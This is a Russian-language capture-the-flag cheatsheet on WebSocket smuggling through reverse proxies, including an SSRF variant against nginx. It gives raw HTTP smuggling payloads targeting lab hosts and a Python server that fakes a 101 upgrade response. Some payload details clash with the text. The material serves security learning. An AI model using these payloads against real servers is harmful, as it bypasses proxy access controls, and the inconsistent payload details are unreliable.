# WebSocket Smuggling — Cheatsheet
https://github.com/0ang3el/websocket-smuggle - более подробное описание

## Что это
Атака, при которой прокси (Varnish, HAProxy, nginx) думает, что соединение переключилось на WebSocket, а бэкенд остался на HTTP. Прокси перестает анализировать трафик (туннель), а бэкенд продолжает обрабатывать HTTP-запросы.


## Условия
- Прокси настроен на поддержку WebSocket (проксирует `Upgrade`-заголовки)
- Прокси **НЕ проверяет** ответ сервера (слепо доверяет, что upgrade прошел)
- Бэкенд не поддерживает запрошенную версию WebSocket (или вообще не имеет WebSocket-эндпоинта)


## Как работает
1. Клиент отправляет запрос с `Upgrade: websocket` и неподдерживаемой версией
2. Прокси видит `Upgrade` → переходит в режим туннеля
3. Бэкенд не может upgrade → отвечает `426` (или `404`)
4. Прокси не смотрит ответ → продолжает туннелировать
5. Клиент отправляет HTTP-запрос (например, на `/flag`) внутри туннеля
6. Прокси пропускает (не анализирует), бэкенд обрабатывает как обычный HTTP


## Ключевой заголовок
Sec-WebSocket-Version: 777

В основном используется версия 13.


Пример payload:

GET / HTTP/1.1
Host: 10.49.175.237:8001
Sec-WebSocket-Version: 73    < важно
Upgrade: WebSocket         < важно
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==   < важно
Connection: Upgrade        < важно

GET /flag HTTP/1.1


# WebSocket Smuggling через SSRF — простыми словами

## Проблема

Nginx (в отличие от Varnish) **проверяет ответ сервера**.  
Если бэкенд не вернул `101 Switching Protocols` — туннель не открывается.  
Наш старый payload (с `Sec-WebSocket-Version: 777`) больше не работает.


## Идея

Заставить бэкенд **самому вернуть `101`**, даже если он не поддерживает WebSocket.  
Для этого используем **SSRF (Server-Side Request Forgery)** — уязвимость, которая позволяет серверу делать запросы куда мы скажем.


## Как это работает

| Шаг | Что происходит |
|-----|----------------|
| 1 | Находим SSRF: `/check-url?server=URL` — сервер делает запрос по этому URL и возвращает статус |
| 2 | Поднимаем свой сервер, который на любой запрос отвечает `101 Switching Protocols` |
| 3 | Отправляем запрос на `/check-url?server=http://НАШ_IP:5555` с WebSocket-заголовками и вторым запросом `/flag` внутри |
| 4 | Nginx видит `Upgrade: websocket` → отправляет запрос бэкенду |
| 5 | Бэкенд делает SSRF-запрос на наш сервер |
| 6 | Наш сервер возвращает `101` |
| 7 | Бэкенд получает `101` и возвращает его Nginx |
| 8 | Nginx видит `101` → думает, что WebSocket установлен → переходит в режим туннеля |
| 9 | Второй запрос (`GET /flag`) проходит через туннель |
| 10 | Бэкенд обрабатывает его как обычный HTTP и возвращает флаг |


## Что нужно для атаки

| Компонент | Зачем |
|-----------|-------|
| SSRF-уязвимость | Чтобы бэкенд сходил на наш сервер |
| Свой сервер с ответом 101 | Чтобы подсунуть нужный ответ |
| WebSocket-заголовки | Чтобы Nginx поверил в upgrade |
| Второй запрос в теле | Чтобы получить флаг через туннель |


## Пример payload

GET /check-url?server=http://192.168.187.139:5555 HTTP/1.1
Host: 10.49.175.237:8002
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1


### Код для pyton-сервера, который возвращает 101:
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.protocol_version = "HTTP/1.1"
        self.send_response(101)
        self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()